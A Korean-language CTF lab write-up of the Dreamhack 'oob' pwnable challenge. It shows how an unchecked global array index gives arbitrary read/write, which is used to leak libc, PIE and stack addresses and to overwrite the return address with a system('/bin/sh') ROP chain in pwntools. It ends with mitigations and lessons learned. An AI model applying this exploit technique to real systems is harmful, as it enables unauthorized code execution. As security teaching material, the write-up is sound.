# 실습 보고서 - OOB Read/Write (Dreamhack oob, #1415)

> 실습 환경: **Dreamhack** (`oob`, pwnable, G4) · WSL(Ubuntu) + Docker에서 분석
> 문제: 전역 배열 인덱스 검증 누락 → OOB Read/Write → libc/스택 leak → ROP

링크: https://dreamhack.io/wargame/challenges/1415

---

## 0. 실습 흐름

```
디컴파일로 취약점 식별 (oob[idx], 인덱스 검증 없음)
          ↓
보호 기법 확인 (checksec) → Full RELRO / Canary / NX / PIE / SHSTK·IBT
          ↓
전역 데이터 배치 분석 (IDA) → oob 바로 뒤에 stdout 포인터 존재
          ↓
stdout leak → libc_base 계산
          ↓
.init_array[0](frame_dummy) leak → PIE 베이스 계산 (oob 실제 주소 확보)
          ↓
environ leak → 스택 주소 확보
          ↓
RET 위치 계산 (environ 기준 상대 거리) → ROP 체인(pop rdi; ret / "/bin/sh" / system) 덮어쓰기
          ↓
로컬 프로세스 대상 익스플로잇 → 셸 획득 성공 (로컬 더미 flag 확인)
          ↓
Dreamhack 서버 전송 → 미해결 (원인 규명 중 중단)
```

---

## 1. 바이너리 분석 (IDA)

소스 코드 없이 바이너리만 제공되어, IDA로 디컴파일해서 분석했다.

**`main` 디컴파일 결과 (요약)**

```c
while (1) {
    while (1) {
        while (1) {
            menu();
            scanf("%d", &choice);
            if (choice != 1) break;

            printf("offset: ");
            scanf("%lld", &offset);                 // 인덱스 검증 없음
            printf("%c\n", (unsigned int)oob[offset]);   // OOB Read (1바이트)
        }
        if (choice != 2) break;

        printf("offset: ");
        scanf("%lld", &offset);
        printf("value: ");
        getchar();
        scanf("%lld", &oob[offset]);                // OOB Write (8바이트!)
    }
    if (choice == 3) break;
    puts("invalid choice");
}
```

- `oob`는 전역 `char oob[] = "Hello, World!"` 배열 (`.data:0x4010`).
- **선택 1(read)**: `offset`을 받아 `oob[offset]`을 `%c`로 1바이트 출력.
- **선택 2(write)**: `offset`과 `value`를 받아 `&oob[offset]`에 `%lld`(8바이트)를 기록.
- **핵심 취약점**: `offset`에 대한 범위 검증(`0 <= offset < sizeof(oob)`)이 전혀 없다.
  - 읽기는 1바이트지만 쓰기는 8바이트라서, `oob`(char 배열) 범위 안에서도 옆 데이터까지 덮어쓸 수 있다.
  - `offset`이 `long long`(부호 있음)이라 **음수/매우 큰 값도 그대로 인덱스로 사용**된다 → 사실상 프로세스 메모리 전체에 대한 **임의 주소 읽기/쓰기(Arbitrary Read/Write)** 프리미티브.

---

## 2. 보호 기법 확인 (checksec)

```bash
checksec --file=deploy/oob
```

| 보호 기법 | 결과 | 의미 |
| --- | --- | --- |
| RELRO | **Full RELRO** | GOT 직접 덮어쓰기 공격 불가 |
| Canary | **있음** | 버퍼 오버플로우로 RET을 직접 덮는 방식은 막힘 |
| NX | **활성** | 셸코드 직접 실행 불가 |
| PIE | **활성** | 바이너리 자체 주소도 매 실행 랜덤화 |
| SHSTK / IBT | **활성(ELF 속성)** | Intel CET 지원을 바이너리가 opt-in. 단, 실제 강제 여부는 CPU/커널에 달림 (7장 참고) |

→ 전통적인 스택 버퍼 오버플로우(Week05)와 달리, **버퍼 자체를 넘치게 하는 게 아니라 인덱스를 조작해 임의 주소를 읽고 쓰는** 방식의 공격이 필요하다.

---

## 3. 전역 데이터 배치 분석

IDA로 `.data`/`.bss` 영역을 확인한 결과:

```
.data:4010  oob     db 'Hello, World!', 0     ← oob 배열 시작 (14바이트)
.data:401E              (= _edata, __bss_start)
.bss :4020  stdout@GLIBC_2_2_5  dq ?           ← stdout 포인터 (8바이트, libc 내부 주소를 담음)
.bss :4030  stdin@GLIBC_2_2_5   dq ?
```

- `oob` 바로 16바이트 뒤에 `stdout` 포인터가 있다.
- `oob`는 char 배열이지만 쓰기는 8바이트 단위라서, `offset=16`부터 8바이트를 쓰면 `stdout` 포인터를 통째로 덮을 수 있다.
- 거꾸로 `offset=16~23`을 1바이트씩 읽으면 `stdout` 포인터 값을 그대로 **leak**할 수 있다 → libc 주소 유출의 발판.

---

## 4. Leak 체계 구축

### 4-1. libc_base (stdout 포인터 leak)

```python
raw = b""
for off in range(16, 24):
    raw += menu_read(off)           # oob[16..23] = stdout 포인터의 각 바이트
stdout_leak = u64(raw)
libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
```

`stdout` 전역 변수에는 libc 내부의 `_IO_2_1_stdout_` 구조체 주소가 들어있다. libc 파일에서 이 심볼의 정적 오프셋을 알면 역산으로 `libc_base`를 구할 수 있다.

### 4-2. PIE 베이스 (`.init_array[0]` leak)

처음에는 `stdout_leak - 16`이 `oob`의 실제 주소라고 착각했다. 하지만 `offset 16~23`에서 읽은 건 **`stdout` 칸의 "주소"가 아니라 그 칸에 들어있는 "내용물"**(libc 주소)이라서 이 계산은 틀렸다.

```
oob(바이너리)  --16바이트--▶  stdout 칸(바이너리)  --(내용물)--▶  libc 안의 주소
```

바이너리 자신의 로드 주소(PIE 베이스)는 libc와 독립적으로 랜덤화되므로 별도로 구해야 한다. `.init_array[0]`에는 `frame_dummy` 함수의 **relocation이 적용된 실제 런타임 주소**가 들어있다는 점을 이용했다.

```python
INIT_ARRAY_OFFSET = 0x3d90 - 0x4010     # oob 기준 정적 거리(-0x280)
FRAME_DUMMY_STATIC = 0x11e0             # nm으로 확인한 frame_dummy의 정적 주소

raw = b""
for i in range(8):
    raw += menu_read(INIT_ARRAY_OFFSET + i)
frame_dummy_leak = u64(raw)
pie_base = frame_dummy_leak - FRAME_DUMMY_STATIC
oob_addr = pie_base + 0x4010            # oob의 진짜 런타임 주소
```

(참고: `GOT[0]`에 `_DYNAMIC` 주소가 들어있다는 통념도 시도했지만, 이 칸은 **relocation이 적용되지 않은 원본 정적값**을 그대로 담는 특수한 칸이라 ASLR 정보가 없었다. `.init_array` 방식이 정답이었다.)

### 4-3. 스택 주소 (`environ` leak)

```python
environ_addr = libc_base + libc.symbols['environ']
environ_idx = environ_addr - oob_addr
raw = b""
for i in range(8):
    raw += menu_read(environ_idx + i)
stack_leak = u64(raw)                   # environ 값 = envp 배열의 스택 주소
```

---

## 5. RET 위치 계산과 환경 의존성

`environ`이 가리키는 위치에서 **몇 바이트 떨어진 곳에 `main()`의 반환 주소(RET)가 있는지**는 실행 환경(환경변수 개수 등)에 따라 달라진다는 걸 디버깅 과정에서 확인했다.

| 실행 방식 | `environ` 대비 RET 오프셋 | 확인 방법 |
| --- | --- | --- |
| `pwntools process()` / `gdb ./oob` 직접 실행 (로컬) | `-0x140` | gdb `info frame` |
| `socat`으로 실행하되 로컬 셸의 전체 환경변수 사용 | `-0x140` | gdb `info frame` |
| `socat`을 **Docker 컨테이너의 최소 환경변수**(`PATH`, `HOSTNAME`, `HOME` 3개)로 실행 | `-0x140`도 틀림 (`stack smashing detected`) | — |
| **실제 Docker 컨테이너 안에서 `gdb -p`로 직접 확인** | `-0x120` (2회 재현) | gdb `info frame`, `x/5i $rip`로 `ret` 명령어 위치 확인 |

→ 환경변수 개수·내용에 따라 스택 최상단(`argv`/`envp`/`auxv`)의 크기가 달라지고, 그 아래 호출 프레임들의 상대 위치도 함께 밀린다. **로컬에서 측정한 오프셋을 그대로 서버(Docker 컨테이너)에 적용하면 안 된다**는 것을 직접 겪으며 확인했다.

```python
ret_addr = stack_leak - 0x120           # Docker 컨테이너에서 gdb로 직접 확인한 값
ret_idx = ret_addr - oob_addr
```

---

## 6. 익스플로잇 작성 (ROP, pwntools)

Canary/PIE/NX가 모두 켜져 있어 Week05의 ret2win 방식(RET을 바로 함수 주소로 덮기)은 쓸 수 없다. 대신 **"어디든 8바이트 쓰기" 프리미티브로 스택의 반환 주소를 직접 덮어** `system("/bin/sh")`를 호출하는 ROP 체인으로 접근했다. (버퍼를 넘치게 하는 게 아니라 임의 주소에 쓰는 것이므로 Canary 검사 자체를 건드리지 않고 우회한다.)

```python
libc.address = libc_base

rop = ROP(libc)
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
ret_gadget = rop.find_gadget(['ret'])[0]      # 스택 16바이트 정렬(movaps 크래시 방지)
chain = p64(ret_gadget) + rop.chain()

for i in range(0, len(chain), 8):
    value = u64(chain[i:i+8])
    menu_write(ret_idx + i, value)

p.recvuntil(b">")
p.sendline(b"3")      # exit → main() 반환 → ROP 체인 실행
p.interactive()
```

**서버와 동일한 libc 확보**: Dockerfile이 `ubuntu:22.04`를 SHA256 해시로 고정해둔 걸 보고, 로컬 WSL의 (최신 업데이트된) libc와 서버의 libc가 다를 수 있다고 판단했다. `docker build`로 Dockerfile 그대로 이미지를 만들고 `docker cp`로 `libc.so.6`을 추출해서 심볼 오프셋 계산에 사용했다.

```bash
docker build -t oob-challenge .
docker create --name oob-tmp oob-challenge
docker cp oob-tmp:/usr/lib/x86_64-linux-gnu/libc.so.6 ./remote_libc.so.6
```

---

## 7. 결과: 로컬 성공, 원격/컨테이너는 미해결

**로컬(`process("./oob")`, 시스템 libc, 오프셋 `-0x140`)에서는 완전히 성공했다.**

```
$ id
uid=1000(eunchae) gid=1000(eunchae) ...
$ cat flag
DH{**flag**}          ← 로컬 더미 flag
```

그러나 같은 로직을 **Dreamhack 실제 서버**와 **로컬에서 직접 띄운 Docker 컨테이너**(서버와 동일 이미지) 양쪽에 모두 적용했지만, 매번 크래시 메시지 없이 `Got EOF`로 조용히 종료되며 셸을 얻지 못했다.

**검증 과정에서 확인한 것 (틀리지 않았음을 확인)**

- 쓰기 직후 readback으로 **실제로 쓴 값이 정확히 들어갔음을 확인**.
- `nm -D`로 `system()`의 정적 오프셋(`0x50d60`)을 직접 확인해, ROP 체인에 쓰인 `system` 주소가 `libc_base + 0x50d60`와 정확히 일치함을 확인.
- Docker 컨테이너 안에 직접 gdb로 붙어 `info frame`과 `x/5i $rip`로 **RET 위치(`environ-0x120`)와 그 자리가 실제 `ret` 명령어임을 2회 재확인**.
- `SHSTK`/`IBT`(Intel CET) 강제 여부를 의심해 호스트(WSL)와 컨테이너 양쪽에서 `/proc/cpuinfo`를 확인했지만, **`shstk`/`ibt` 플래그 자체가 없어 CET가 원인은 아닌 것으로 보인다.**

**결론적으로 원인 미규명 상태로 중단.** leak 체계(libc_base, PIE base, 스택 주소)와 RET 오프셋 계산, ROP 체인 구성까지는 모두 검증됐지만, 실제 반환(`ret`) 시점에 어떤 이유로든 의도한 코드로 점프하지 못하고 있다. 다음 시도에서 이어갈 만한 방향:

- 컨테이너 안에서 `ret` 실행 **그 다음 명령어까지** 단계별(`stepi`)로 추적해 실제로 어디로 점프하는지 직접 확인
- one_gadget 대신 `pop rdi; ret` 체인이 아닌 다른 방식(예: `execve` 계열 one_gadget의 세부 레지스터 조건 재검증)
- 공식 풀이/다른 풀이 참고 (문제 열람 권한 문제로 이번엔 확인 못 함)

---

## 8. 취약점 발생 원인

- 전역 배열 `oob`에 접근할 때 `offset`(인덱스)에 대한 **범위 검증이 전혀 없다** (`0 <= offset < sizeof(oob)` 체크 부재).
- 읽기는 1바이트, 쓰기는 8바이트로 **타입/크기가 일치하지 않아**, 배열 범위 안에서도 쓰기 한 번에 옆 데이터까지 침범한다.
- `offset`이 부호 있는 `long long`이라 **음수 인덱스**도 그대로 통과된다.
- 결과적으로 프로세스의 전체 가상 주소 공간에 대한 **임의 읽기/쓰기(Arbitrary R/W)**가 가능해진다.

## 9. 대응 방안

- 배열 접근 전 `0 <= offset < sizeof(oob)` 범위 검증을 반드시 수행한다.
- 읽기/쓰기 단위를 배열의 실제 원소 크기(1바이트, char)로 통일한다.
- 가능하면 `offset`을 부호 없는 타입으로 받고, 상한값까지 함께 검증한다.
- 컴파일러/런타임 차원에서는 AddressSanitizer(ASan) 등으로 이런 OOB 접근을 조기에 탐지할 수 있다.

## 10. 배운 점 / 회고

- **"무엇을 leak했는지"와 "그 leak이 가리키는 대상의 주소 자체"를 혼동하면 안 된다.** `stdout` 포인터의 *값*(libc 주소)과 `stdout` *변수 칸의 주소*(바이너리 주소)는 완전히 다른 것인데, 처음엔 이걸 헷갈려서 한참 헤맸다. `.init_array`처럼 "relocation이 적용된 자기 자신의 주소를 담고 있는 슬롯"을 찾는 게 PIE 베이스 leak의 핵심이었다.
- **로컬에서 측정한 상수(오프셋)를 서버에 그대로 들고 가면 안 된다.** 환경변수 개수만 달라져도 스택 레이아웃이 통째로 밀린다는 걸 직접 체감했다. 이번엔 Docker로 서버와 똑같은 환경을 복제해서 재검증하는 방법까지 배웠다.
- Full RELRO + Canary + PIE + NX가 모두 걸려 있어도, **버퍼 오버플로우가 아니라 임의 주소 쓰기 프리미티브라면 Canary를 아예 우회**하고 스택의 RET을 직접 조작할 수 있다는 걸 확인했다 (Week05의 "버퍼를 넘쳐서 RET까지 도달"하는 방식과의 결정적 차이).
- `docker build`/`docker cp`로 **서버와 동일한 libc를 직접 추출**하는 방법, Dockerfile의 `COPY`/`CMD`를 보고 서버의 실행 방식(`socat ... EXEC:./oob`)을 그대로 로컬에 재현하는 방법을 배웠다.
- 끝까지 셸을 따진 못했지만, "검증 가능한 것들을 하나씩 직접 확인하며 좁혀가는" 디버깅 과정 자체가 이번 실습의 핵심 소득이었다.
